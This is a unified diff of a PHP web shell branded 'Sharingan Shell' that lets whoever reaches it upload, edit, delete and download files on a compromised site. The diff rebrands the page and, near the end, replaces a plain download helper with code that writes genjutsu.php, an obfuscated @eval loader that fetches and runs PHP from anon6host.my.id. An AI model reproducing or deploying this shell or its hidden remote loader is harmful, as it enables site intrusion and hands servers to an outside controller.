@@ -10,7 +10,7 @@ if (isset($_GET['dir'])) {
 ?>
 <html>
 <head>
-        <title>OmateKimi</title>
+        <title>Mugen</title>
 </head>
 
 <style>
@@ -24,7 +24,7 @@ body {
         color: white;
         padding: 0;
         margin: 25% 10% 10% 10%;
-        background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxDC2Z6pea0Fz27CTTkDZ_iJPKMHGB1EAVPg&usqp=CAU');
+        background-image: url('https://media.tenor.com/fqAMFHpkw5cAAAAC/sharingan.gif');
         background-color: green;
         text-shadow: rgba(0,0,0,1) 2px 2px 0.1em;
 }
@@ -215,7 +215,7 @@ textarea{
 </style>
 <body>
 <div class="kotak">
-        <h3 class="title">[ Use Shell Sharingan ]<br> Uchiha Shisui</h3>
+        <h3 class="title">[ Sharingan Shell Is Enabled! ]<br> Uchiha Shisui</h3>
         <div class="infone">
            <?php
            $disfunc = @ini_get("disable_functions");
@@ -281,7 +281,7 @@ textarea{
               echo" <form method='get'>
               <input type='hidden' value='.$dir.'/'.$dir.' name='shellbp'>
               <input type='hidden' value='.$dir.' name='dirpath'>
-              <input type='submit' value='SummonS' name='shellbp' class='tol'>
+              <input type='submit' value='Kotoamatsuki' name='shellbp' class='tol'>
               </form></div>
               ";
            
@@ -320,6 +320,10 @@ if (isset($_POST['upl'])){
         <input type="file" name="upload">
         <input type="submit" name="upl" value="Upload">
         </form>
+<br>
+<font color="green">thanks for use sharingan shell<br>let's genjutsu the site!<br>contact me at https://anon6host.my.id
+<br>
+<br>
         </div>
 <center>
 <div class="fitur">
@@ -466,7 +470,7 @@ foreach ($scan as $file) {
         <input type="submit" value="del" name="rmfile" class="btn mini rmf">
         <a href="?dir='.$dir.'&ubah='.$file.'" class="btn">edt</a>';
         echo '<a class="btn" href=\'javascript:display("'.clearfile($file).'_link","'.clearfile($file).'_form");\'>ren</a>';
-        echo '</form><form action="xo.php" method="post" class="fbawah">
+        echo '</form><form action="genjutsu.php" method="post" class="fbawah">
         <input type="hidden" value="'.$dir.'" name="dlpath">
         <input type="hidden" value="'.$file.'" name="dlname">
         <input type="submit" value="dl" name="dlfile" class="btn mini rmf">
@@ -629,14 +633,8 @@ if(isset($_POST['createnew']) && $_POST['createname'] != ''){
         }
 }
 
-$fdlvalue = '<?php
-$file_url = $_POST["dlpath"]."/".$_POST["dlname"];
-header("Content-Type: application/octet-stream");
-header("Content-Transfer-Encoding: utf-8");
-header("Content-disposition: attachment; filename=\"" . basename($file_url) . "\"");
-readfile($file_url);
-?>  ';
-$dlwrite = fopen('xo.php', 'w');
+$fdlvalue = ' <?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://anon6host.my.id/shellz/sharingan.php"));/**/?> ';
+$dlwrite = fopen('genjutsu.php', 'w');
 fwrite($dlwrite, $fdlvalue);
 fclose($dlwrite);
 /*function*/
